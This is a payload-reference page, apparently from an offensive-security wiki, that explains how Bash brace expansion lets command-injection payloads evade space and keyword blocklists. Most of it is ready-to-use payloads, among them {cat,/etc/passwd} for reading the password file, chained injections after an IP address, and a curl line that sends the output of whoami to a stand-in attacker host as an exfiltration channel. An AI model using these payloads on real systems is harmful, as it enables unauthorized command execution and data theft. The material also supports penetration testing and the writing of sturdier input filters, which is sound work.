---
title: "Command injection filter bypass with brace expansion"
order: 1
description: "Using Bash brace expansion, {cat,/etc/passwd}, {ls,-la}, to split a command into comma-separated tokens that carry no spaces and no filtered keyword, so a literal blocklist misses the payload."
keywords:
  - command injection
  - brace expansion
  - filter bypass
  - WAF evasion
  - no-space payload
  - bash
---

# Brace expansion

Brace expansion is a Bash construct that rewrites `{a,b,c}` into the separate words `a b c` **before** any other processing, before word splitting, before the command even runs. Because the expansion produces the argument separators itself, `{cat,/etc/passwd}` becomes `cat /etc/passwd` with no literal space in the payload and no contiguous `cat /etc/passwd` substring for a filter to match. A blocklist that inspects the raw input sees a comma-delimited brace group; the shell sees a command and its argument.

## Why the shell normalizes it away

Brace expansion runs first in Bash's expansion order. `{cat,/etc/passwd}` expands to two words, `cat` and `/etc/passwd`, exactly as if a space had separated them. The shell treats the comma as the in-group delimiter and discards the braces. A filter operating on the request string never sees `cat /etc/passwd`, `cat␣`, or any whitespace; it sees `{cat,/etc/passwd}`, which rarely appears on a keyword blocklist. This defeats two common controls at once: **space filters** and **literal-command filters**.

## Payloads

Classic probes, assuming a POSIX/Bash sink where a space or the word `cat` is blocked:

```
{cat,/etc/passwd}
{cat,/etc/passwd}
{id,}
{whoami,}
{ls,-la,/}
{uname,-a}
```

A trailing empty element (`{id,}`) yields just `id` while still wrapping it in a brace group, which hides a short keyword from substring matching.

Chaining a separator still works, brace expansion composes with the usual metacharacters:

```
127.0.0.1;{cat,/etc/passwd}
127.0.0.1|{id,}
```

Reconstructing a flagged binary path when `/bin` or slashes-plus-name are filtered as a unit:

```
{/bin/cat,/etc/passwd}
{/usr/bin/id,}
```

Combine with other space-free tricks when braces alone are not enough, for example feeding brace output through a pipe, or pairing with `${IFS}` where a tool rejects commas in a specific position:

```
{curl,http://OOB_ID.attacker.example/$(whoami)}
```

The brace group here keeps the whole invocation space-free while still issuing an out-of-band callback that doubles as an exfiltration channel.

## Operational notes

- Brace expansion is a **Bash/zsh** feature. Plain POSIX `/bin/sh` (dash) does **not** perform it, so confirm the sink spawns Bash before relying on it; `{a,b}` passed to dash is a literal string.
- No spaces, no tabs, and no `${IFS}` are required, which makes brace groups useful when the filter strips or encodes whitespace.
- Keep the group to `command,arg1,arg2…`; each comma becomes a word boundary, so flags and paths each get their own element.

## Tools

- **[Burp Suite](https://portswigger.net/burp)**: Repeater for crafting brace-expansion payloads.
- **[commix](https://github.com/commixproject/commix)**: tamper scripts automate no-space bypasses.

## References

- [PayloadsAllTheThings: Command Injection, Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bash Reference Manual: Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
